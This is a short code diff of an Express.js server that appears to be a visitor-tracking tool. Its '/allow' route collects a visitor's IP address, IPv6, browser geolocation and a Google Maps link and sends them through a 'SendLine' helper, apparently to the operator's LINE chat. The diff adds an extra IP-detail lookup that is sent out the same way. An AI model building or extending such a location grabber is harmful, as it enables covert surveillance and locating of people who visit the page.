@@ -12,7 +12,7 @@ app.use(express.urlencoded({
 app.get("/",(req,res)=> {
     
   res.send("version3");
-  m
+  
 })
 app.get("/client/:acc",(req,res)=> {
     var Account = req.params.acc;
@@ -30,12 +30,19 @@ app.get("/allow",async function(req,res){
             + "Date time : "+lib.GetDateTime()+'\r\n'
             + "IP : "+lib.GetIP() + '\r\n'
             + "IPv6 : "+lib.GetIPv6(req) + '\r\n'
-            //+ await lib.GetDetail() + '\r\n'
+            //+ await lib.GetDetailwithIP(lib.GetIPv6(req)) + '\r\n'
             + "Latitude,Longitude on web : " + Latitude + '\r\n'
-            + "Google Map (allow location) : https://www.google.com/maps/?q="+Latitude
+            + "Google Map (allow location) : https://www.google.com/maps/?q="+Latitude  
 
     await lib.SendLine(txt);
+
+    var txt2 = '\r\n'+ "*** Detail from IPv6 ***" + '\r\n'
+            + await lib.GetDetailwithIP(lib.GetIPv6(req))
+
+    await lib.SendLine(txt2);
     await open("https://www.google.com/maps/?q="+Latitude,{app: ['google chrome']})
+
+
     res.send("Done");
 })
 
